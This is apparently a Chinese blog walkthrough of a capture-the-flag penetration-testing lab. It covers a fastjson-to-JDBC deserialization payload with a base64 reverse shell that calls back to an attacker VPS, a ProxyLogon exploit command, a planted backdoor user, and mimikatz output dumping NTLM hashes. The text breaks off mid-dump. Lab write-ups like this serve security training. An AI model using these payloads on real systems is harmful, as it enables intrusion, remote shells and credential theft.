    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>还是用fscan扫下端口看看有啥 东西吗</p><img src="/post/e42dd187/IMAGE20250309213109841.png" class=""><p>发现有个ERP web服务看看</p><img src="/post/e42dd187/IMAGE20250309213235268.png" class=""><p>弱口令 admin/123456直接登录进了后台，但是好像没啥用处。这里查资料说有一个fastjson漏洞在后台。</p><h2 id="华夏ERP-反序列化">华夏ERP 反序列化</h2><p>用yakit验证下是否存在漏洞</p><img src="/post/e42dd187/IMAGE20250309214001747.png" class=""><img src="/post/e42dd187/IMAGE20250309214009087.png" class=""><p>发现解析了，应该是存在漏洞的。</p><p>参考下这篇文章：<a href="https://www.cnblogs.com/kingbridge/articles/16720318.html%E6%89%93JDBC">https://www.cnblogs.com/kingbridge/articles/16720318.html打JDBC</a></p><p>现在vps起一个恶意的mysql服务，然后编辑配置文件 config.json,这里base64加密的为反弹的shell，记得把ysoserial-all.jar放在同目录下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;ysoserialPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;ysoserial-all.jar&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;javaBinPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;fileOutputDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;./fileOutput/&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;displayFileContentOnScreen&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;saveToFile&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;index_php&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ssrf&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://www.baidu.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;__defaultFiles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Jdk7u21&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;Jdk7u21&quot;</span><span class="punctuation">,</span><span class="string">&quot;calc&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CommonsCollections6&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonCollections6&quot;</span><span class="punctuation">,</span><span class="string">&quot;bash -c &#123;echo,base64反弹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后向网站发送payload,记得URL编码一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">&quot;hostToConnectTo&quot;: &quot;Vps地址&quot;,</span><br><span class="line">&quot;portToConnectTo&quot;: 3306,</span><br><span class="line">&quot;info&quot;: &#123;</span><br><span class="line">&quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,base64反弹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;,</span><br><span class="line">&quot;password&quot;: &quot;pass&quot;,</span><br><span class="line">&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">&quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class="line">&quot;NUM_HOSTS&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309220657646.png" class=""><p>成功拿到shell并且是root权限，接下来就是内网渗透</p><img src="/post/e42dd187/IMAGE20250309220911082.png" class=""><h2 id="内网渗透">内网渗透</h2><p>上传下fscan 和 代理工具,先扫描一波内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.3.12     is alive</span><br><span class="line">(icmp) Target 172.22.3.2      is alive</span><br><span class="line">(icmp) Target 172.22.3.9      is alive</span><br><span class="line">(icmp) Target 172.22.3.26     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.3.12:8000 open</span><br><span class="line">172.22.3.26:445 open</span><br><span class="line">172.22.3.9:445 open</span><br><span class="line">172.22.3.2:445 open</span><br><span class="line">172.22.3.9:443 open</span><br><span class="line">172.22.3.26:139 open</span><br><span class="line">172.22.3.2:139 open</span><br><span class="line">172.22.3.9:139 open</span><br><span class="line">172.22.3.26:135 open</span><br><span class="line">172.22.3.9:135 open</span><br><span class="line">172.22.3.2:135 open</span><br><span class="line">172.22.3.9:81 open</span><br><span class="line">172.22.3.9:80 open</span><br><span class="line">172.22.3.9:808 open</span><br><span class="line">172.22.3.12:80 open</span><br><span class="line">172.22.3.12:22 open</span><br><span class="line">172.22.3.2:88 open</span><br><span class="line">172.22.3.9:8172 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.26</span><br><span class="line">   [-&gt;]XIAORANG-PC</span><br><span class="line">   [-&gt;]172.22.3.26</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.9</span><br><span class="line">   [-&gt;]XIAORANG-EXC01</span><br><span class="line">   [-&gt;]172.22.3.9</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.2</span><br><span class="line">   [-&gt;]XIAORANG-WIN16</span><br><span class="line">   [-&gt;]172.22.3.2</span><br><span class="line">[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          </span><br><span class="line">[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         \Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。</span><br><span class="line">[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br><span class="line">已完成 18/18</span><br><span class="line">[*] 扫描结束,耗时: 10.887125746s</span><br></pre></td></tr></table></figure><h3 id="ProxyLogon">ProxyLogon</h3><p>看到exchange服务在172.22.3.9上，搭上代理去访问一下看看</p><img src="/post/e42dd187/IMAGE20250309221330118.png" class=""><p>直接打<a href="https://github.com/hausec/ProxyLogon">ProxyLogon</a> 具体原理参考如下文章</p><p><a href="https://blog.caspersun.club/2022/12/19/proxylogon/">https://blog.caspersun.club/2022/12/19/proxylogon/</a><br><a href="https://www.cnblogs.com/nice0e3/p/15762864.html#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">https://www.cnblogs.com/nice0e3/p/15762864.html#攻击流程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309221940855.png" class=""><p>拿到system权限，为了方便传文件咱添加个后门用户然后rdp上去</p><img src="/post/e42dd187/IMAGE20250309222206378.png" class=""><p>上来先拿flag</p><img src="/post/e42dd187/IMAGE20250309222444329.png" class=""><p>然后在抓hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10576195 (00000000:00a16143)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 22:22:56</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10583412 (00000000:00a17d74)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : oceanzbz</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/9 22:22:57</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line">         * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9221421 (00000000:008cb52d)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 22:08:58</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 35bfe7dfd4d17ac2818d87cbf05c329f</span><br><span class="line">         * SHA1     : 6c6b68b0387fbdb4d31817b66622cfca76336150</span><br><span class="line">         * DPAPI    : a19236c444273572ec37702b84933168</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2184711 (00000000:00215607)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:29:26</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 